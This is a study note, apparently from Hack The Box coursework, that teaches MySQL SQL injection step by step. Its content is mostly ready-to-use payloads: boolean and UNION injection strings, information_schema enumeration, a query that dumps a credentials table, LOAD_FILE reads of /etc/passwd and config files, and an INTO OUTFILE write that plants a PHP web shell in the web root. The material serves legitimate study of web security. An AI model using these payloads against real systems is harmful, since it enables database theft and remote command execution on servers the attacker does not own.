Related articles:
Tags: #Maneuvers 

---
# 📖 Definition: 
A SQL Injection is a term and maneuver used for the manipulation of input fields that accept user-controlled strings. These strings are maliciously crafted to match the SQL syntax in order to retrieve data from the database.
![[Pasted image 20250208000854.png]]
Recon is the swag, Recon is the must. In order to be able to successfully craft SQL Injection we must know and understand the underlying database version. This can be achieved purely through sending requests with different syntaxes matching different SQL databases.

# Intro to MySQL
Let's first see how to authenticate to a mysql db through the CLI.
```bash
mysql -u root -h docker.hackthebox.eu -P 3306 -p 
```
A Structured-Relational DB like MySQL will be made out of databases which will be made out of tables which will be made out rows and columns. Columns are merely 2D Arrays and the SQL supports commands that can perform various operations on the "table"/2D Array. 
One place where we can find more about the structure of the MySQL DB is through `information_schema.schemata`.

Before starting creating complex queries, we must understand the operator precedence:

## Multiple Operator Precedence

SQL supports various other operations such as addition, division as well as bitwise operations. Thus, a query could have multiple expressions with multiple operations at once. The order of these operations is decided through operator precedence.

Here is a list of common operations and their precedence, as seen in the [MariaDB Documentation](https://mariadb.com/kb/en/operator-precedence/):

- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

Operations at the top are evaluated before the ones at the bottom of the list. Let us look at an example:
```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```
The query has four operations: `!=`, `AND`, `>`, and `-`. From the operator precedence, we know that subtraction comes first, so it will first evaluate `3 - 2` to `1`:

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 1;
```

## Types of SQL Injections
![[Pasted image 20250208114629.png]]

# Boolean-Based SQL Injection

## Core Characteristics

|Aspect|Description|Example|
|---|---|---|
|Detection Method|Page behavior changes based on TRUE/FALSE conditions|`AND 1=1` vs `AND 1=2`|
|Response Type|Binary response (success/failure)|Page loads vs error, or content differs|
|Data Extraction|Done character by character using conditional statements|`SUBSTRING()`, `ASCII()`, `LENGTH()`|
|Execution Speed|Generally slower than UNION-based|Requires multiple queries to extract data|

## Common Boolean Techniques

|Technique|Syntax Example|Purpose|Response Indication|
|---|---|---|---|
|Basic Truth Test|`' AND 1=1-- -`|Verify injection point|Page loads normally|
|Basic False Test|`' AND 1=2-- -`|Confirm boolean logic works|Page shows error/different content|
|String Length|`' AND LENGTH(database())>1-- -`|Determine string length|True response means string is longer|
|Character Testing|`' AND SUBSTRING(database(),1,1)='a'-- -`|Extract characters|True response means character match|
|Numeric Comparison|`' AND ASCII(SUBSTRING(database(),1,1))>90-- -`|Binary search through ASCII values|Narrows down possible characters|

## Data Extraction Methods

|Method|Query Pattern|Advantages|Disadvantages|
|---|---|---|---|
|Binary Search|`ASCII(SUBSTR()) > [mid-point]`|Faster than linear search|More complex queries|
|Linear Search|`SUBSTR() = '[char]'`|Simpler to implement|Slower execution|
|Bit Testing|`ASCII(SUBSTR()) & [power-of-2]`|Works with limited characters|Most requests needed|

## Common Functions Used

|Function|Purpose|Example Usage|
|---|---|---|
|SUBSTRING()|Extract part of string|`SUBSTRING(@@version,1,1)`|
|ASCII()|Get character ASCII value|`ASCII(SUBSTRING(name,1,1))`|
|LENGTH()|Get string length|`LENGTH(DATABASE())`|
|SLEEP()|Time-based verification|`AND IF(SUBSTR(name,1,1)='a',SLEEP(2),0)`|

## Error Prevention

|Issue|Solution|Example|
|---|---|---|
|String Quotes|Use hex encoding|`0x6461746162617365` instead of 'database'|
|Special Characters|URL encoding|`%20` for space, `%27` for single quote|
|Comment Blocks|Multiple comment styles|`--`, `#`, `/**/`|
# SQL Union Injection Detection and Exploitation

## Overview

A Union-based SQL injection becomes possible when we can manipulate a query to combine its results with those of another query using the UNION operator. This technique is particularly effective when we can see the query results on the page.

## Detection Methods Comparison

|Method|Approach|Success Indicator|Failure Indicator|Key Characteristics|
|---|---|---|---|---|
|ORDER BY|Start with `ORDER BY 1` and increment until failure|Normal results with different sorting|Error message or no output|Always returns results until hitting the column limit|
|UNION|Try `UNION SELECT` with different numbers of columns|Success when column numbers match|Error about column count mismatch|Returns errors until hitting correct column count|

## ORDER BY Method Steps

|Step|Query Example|Expected Outcome|Interpretation|
|---|---|---|---|
|Initial Test|`' ORDER BY 1-- -`|Normal results|At least 1 column exists|
|Secondary Test|`' ORDER BY 2-- -`|Normal results with different sorting|At least 2 columns exist|
|Continue Testing|`' ORDER BY n-- -`|Normal results until error|Keep incrementing until error|
|Final Test|`' ORDER BY 5-- -`|Error message|Table has (n-1) columns where n caused the first error|

## UNION Method Steps

|Step|Query Example|Expected Outcome|Interpretation|
|---|---|---|---|
|Initial Attempt|`cn' UNION SELECT 1,2,3-- -`|Error: column count mismatch|Wrong number of columns|
|Adjustment|`cn' UNION SELECT 1,2,3,4-- -`|Successful results|Correct number of columns found|
|Verification|Check which numbers appear in output|Only certain numbers visible|Identifies injectable columns|

## Column Output Visibility

|Output Type|Description|Example|
|---|---|---|
|Visible Columns|Columns whose values appear in the page output|Numbers 2, 3, 4 visible in results|
|Hidden Columns|Columns returned but not displayed|Number 1 not visible in output|
|Injectable Positions|Columns where data can be extracted|Use visible columns for data extracti|

# MySQL Database Enumeration and Fingerprinting Guide

## MySQL Fingerprinting Methods

|Detection Method|Query|Expected Output|Use Case|Notes|
|---|---|---|---|---|
|Version Check|`SELECT @@version`|MySQL Version (e.g., '10.3.22-MariaDB-1ubuntu1')|Full query output available|Will return MSSQL version in MSSQL|
|Power Function|`SELECT POW(1,1)`|Returns '1'|Numeric output only|Errors on non-MySQL DBMS|
|Sleep Function|`SELECT SLEEP(5)`|Delays response by 5 seconds|Blind/No output scenarios|No delay on other DBMS|

## Database Structure Navigation

### INFORMATION_SCHEMA Database

The INFORMATION_SCHEMA database serves as a metadata repository containing information about the entire database system. Think of it as a map that helps us navigate through all databases, tables, and columns.

|Component|Table Name|Key Columns|Purpose|Query Example|
|---|---|---|---|---|
|Databases|SCHEMATA|SCHEMA_NAME|Lists all databases|`SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA`|
|Tables|TABLES|TABLE_NAME, TABLE_SCHEMA|Lists all tables|`SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES`|
|Columns|COLUMNS|COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA|Lists all columns|`SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS`|

### Database Enumeration Process

|Step|Purpose|Example Query|Notes|
|---|---|---|---|
|1. Identify Current Database|Find active database|`SELECT database()`|Useful starting point|
|2. List All Databases|Enumerate available databases|`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`|Ignore default DBs (mysql, information_schema, performance_schema)|
|3. List Tables|Find tables in target database|`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`|Use WHERE clause to filter specific database|
|4. List Columns|Get column names for target table|`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`|Essential for forming final query|
|5. Extract Data|Retrieve actual data|`cn' UNION select 1, username, password, 4 from dev.credentials-- -`|Use dot notation for cross-database queries|

### Cross-Database Reference

When accessing tables from different databases, use the dot operator syntax:

`SELECT * FROM database_name.table_name;`

### Important Concepts to Remember

1. Database Reference

- Default Databases: mysql, information_schema, performance_schema (sometimes 'sys')
- These can be ignored during enumeration as they're standard MySQL installations

2. Query Construction

- Always specify full path when accessing other databases
- Use proper column count in UNION queries
- Include appropriate comment terminators (`-- -`)

1. Best Practices

- Start with database enumeration
- Move to table enumeration
- Finally column enumeration
- Build final data extraction query

# Advanced MySQL SQL Injection: File System Access Guide

## Understanding Database User Privileges and File Access

### Database User Identification Methods

|Method|Query|Purpose|Example Output|
|---|---|---|---|
|`USER()`|`SELECT USER()`|Returns current user with hostname|'root@localhost'|
|`CURRENT_USER()`|`SELECT CURRENT_USER()`|Alternative to USER()|'root@localhost'|
|Direct Query|`SELECT user from mysql.user`|Lists all database users|Multiple user rows|

### Privilege Verification System

|Privilege Check|Query|Purpose|Expected Output|
|---|---|---|---|
|Superuser Check|`SELECT super_priv FROM mysql.user`|Checks for admin rights|'Y' or 'N'|
|Detailed Privileges|`SELECT grantee, privilege_type FROM information_schema.user_privileges`|Lists all user privileges|List of privileges|
|File Access Check|Check for 'FILE' privilege|Determines file read/write capability|Present in privileges list|

## File Reading Operations

### LOAD_FILE Function Usage

|Aspect|Details|Example|
|---|---|---|
|Basic Syntax|`LOAD_FILE('/path/to/file')`|`SELECT LOAD_FILE('/etc/passwd')`|
|Required Privileges|FILE privilege must be enabled|Verify with privilege check|
|OS Permissions|MySQL user needs read access|Check OS user permissions|

### Common Target Files

|File Type|Typical Path|Purpose|Example Query|
|---|---|---|---|
|System Files|`/etc/passwd`|User enumeration|`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`|
|Web Source|`/var/www/html/file.php`|Application code|`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`|
|Config Files|`/etc/mysql/my.cnf`|Service configurations|`cn' UNION SELECT 1, LOAD_FILE("/etc/mysql/my.cnf"), 3, 4-- -`|

### Security Implications Matrix

|Access Level|Potential Risk|Mitigation|
|---|---|---|
|Source Code Access|Application logic exposure|Restrict FILE privilege|
|Configuration Files|Credential exposure|Use separate config storage|
|System Files|System enumeration|Limit MySQL user permissions|

### Step-by-Step Exploitation Process

1. **User Identification**

    `cn' UNION SELECT 1, user(), 3, 4-- -`
    - Identifies current database user
    - Provides context for available privileges
2. **Privilege Enumeration**
    
    `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
    - Checks superuser status
    - Foundation for understanding capabilities
3. **Detailed Privilege Check**

    `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges  WHERE grantee="'root'@'localhost'"-- -`
    - Lists all available privileges
    - Confirms FILE privilege availability
4. **File Reading**
    
    `cn' UNION SELECT 1, LOAD_FILE("/target/file/path"), 3, 4-- -`
    - Executes actual file read
    - Returns file contents in query results

# Understanding File Write Operations in MySQL Injection
## Core Prerequisites for File Writing
Let me explain the three essential requirements for writing files to a server through MySQL, and why each matters:

### 1. User Privileges
First, we need a user with the FILE privilege enabled. This is MySQL's way of controlling who can interact with the server's file system. Think of it like having a special key that unlocks the ability to read and write files.

### 2. Security Configuration Check
The `secure_file_priv` variable acts as a gatekeeper for file operations. Here's how it works:

- Empty value ('') → Complete freedom to read/write anywhere
- Specific directory → Limited to that directory only
- NULL → No file operations allowed anywhere

To check this setting, we use:

`cn' UNION SELECT 1, variable_name, variable_value, 4  FROM information_schema.global_variables  where variable_name="secure_file_priv"-- -`

### 3. Operating System Permissions
Even with database permissions, we still need the MySQL service account to have proper filesystem permissions for our target directory.
## Writing Files Through SQL: A Step-by-Step Guide
### Basic File Writing
Let's start with the simplest case - writing a text file:

`SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`

This works like saving a text file through any program, but we're doing it through SQL. The resulting file will be owned by the MySQL user.

### Advanced Writing Techniques
For more complex files, we can use base64 encoding:
`-- Writing binary or complex data SELECT FROM_BASE64("base64_encoded_content") INTO OUTFILE '/path/to/file'`

### Writing Web Shells: A Practical Example
Here's how we progress from simple file writing to creating a web shell:
1. **Test Write Access**
`cn' union select 1,'file written successfully!',3,4  into outfile '/var/www/html/proof.txt'-- -`

2. **Create Web Shell**
`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", ""  into outfile '/var/www/html/shell.php'-- -`

The empty strings (`""`) replace numbers to create cleaner output.

## Understanding the Security Implications

Think of this capability like having a master key to a building. With great power comes great responsibility:

1. **File System Access**: Writing files anywhere the database user has permission
2. **Code Execution**: Potential to execute commands on the server
3. **Persistence**: Ability to maintain access through uploaded files

## Common Challenges and Solutions

### 1. Finding the Web Root

To write files that are accessible via the web server, we need to know where to put them. Here are our options:

- Read server configurations:
    - Apache: `/etc/apache2/apache2.conf`
    - Nginx: `/etc/nginx/nginx.conf`
    - IIS: `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`

# MySQL File Operations Through SQL Injection - Quick Reference

## Core Requirements for File Operations

|Requirement|Check Query|Success Indicator|Notes|
|---|---|---|---|
|FILE Privilege|`SELECT grantee, privilege_type FROM information_schema.user_privileges`|`FILE` in privileges list|Must be enabled for user|
|secure_file_priv|`SELECT variable_value FROM information_schema.global_variables WHERE variable_name="secure_file_priv"`|Empty value (`''`)|`NULL` blocks all operations|
|OS Permissions|Check MySQL user write access|File creation successful|MySQL service account needs rights|

## File Writing Operations

|Operation|Query Example|Purpose|Success Check|
|---|---|---|---|
|Test Write|`SELECT 'test' INTO OUTFILE '/tmp/test.txt'`|Verify permissions|File appears and readable|
|Basic Shell|`SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php'`|Command execution|Accessible via web browser|
|Clean Output|`UNION SELECT "","payload","","" INTO OUTFILE '/path'`|Avoid numeric artifacts|Clean file content|
|Base64 Write|`SELECT FROM_BASE64("b64_data") INTO OUTFILE '/path'`|Binary/complex files|File integrity matches|

## Common Web Roots

|Server|Default Path|Config Location|Alternative|
|---|---|---|---|
|Apache|`/var/www/html`|`/etc/apache2/apache2.conf`|`/usr/local/apache2/htdocs`|
|Nginx|`/usr/share/nginx/html`|`/etc/nginx/nginx.conf`|`/var/www/nginx-default`|
|IIS|`C:\inetpub\wwwroot`|`%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`|`D:\web`|
